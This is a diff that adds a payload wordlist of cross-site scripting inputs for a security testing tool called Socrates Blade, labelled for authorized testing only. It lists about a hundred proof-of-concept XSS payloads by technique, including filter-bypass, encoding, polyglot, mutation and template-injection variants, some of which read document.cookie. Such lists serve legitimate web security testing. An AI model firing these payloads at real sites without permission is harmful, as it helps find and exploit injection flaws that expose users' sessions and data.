@@ -1,0 +1,116 @@
+# XSS Payloads for Socrates Blade v3.2
+# These payloads are for authorized security testing only
+# Format: One payload per line, lines starting with # are comments
+
+# Basic script injection
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Image onerror injection
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.domain)>
+<image src=x onerror=alert(1)>
+<IMG SRC=x onerror=alert(1)>
+
+# SVG injection
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg/onload=alert(document.cookie)>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+
+# Event handlers
+<body onload=alert(1)>
+<body ONLOAD=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert('XSS')">
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<canvas><foreignobject onerror="alert(1)">
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:prompt(1)
+javascript:alert(document.cookie)
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html,<img src=x onerror=alert(1)>
+data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+
+# Polyglot payloads (XSS in multiple contexts)
+'><script>alert(String.fromCharCode(88,83,83))</script>
+"><script>alert('XSS')</script>
+'><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+javascript:/*--></title></style></textarea></xmp></script>--><svg/onload=alert(1)>
+<!--><script>alert(1)</script>-->
+<script>alert(/*Malicious*/'XSS')</script>
+
+# Filter bypass techniques
+<SCRIPT>alert(1)</SCRIPT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC="jav&#x61;script:alert('XSS');">
+<IMG SRC="jav&#x41;script:alert('XSS');">
+<img src="x:alert(1)">
+
+# Unicode/Encoding bypass
+<script>\u0061lert(1)</script>
+<script>\x3cscript\x3ealert(1)\x3c/script\x3e>
+
+# mXSS (mutation XSS) candidates
+<noscript><p title="</noscript><script>alert(1)</script>">
+<math><mtext><table><mglyph><style><math><img src=x onerror=alert(1)>
+
+# DOM-based XSS
+#<script>alert(1)</script>
+?q=<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+
+# Expression-based (CSS)
+<div style="xss:expression(alert(1))">
+<style>body{background:url('xss:expression(alert(1))')}</style>
+
+# Link-based
+<link rel="import" href="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+
+# Meta tag
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Animation events
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributename=onmouseover to=alert(1)>
+</svg>
+
+# Form-based
+<form method="POST" action="javascript:alert(1)"><input type="submit" value="XSS">
+
+# Object/embed
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# Template injection style
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+
+# Angular/Vue style
+{{alert(1)}}
+{{$on.constructor('alert(1)')()}}
+v-html with <script>alert(1)</script>
+
+# React style
+<img src=x onerror={alert(1)}>
+<div onClick={alert(1)}>Click</div>
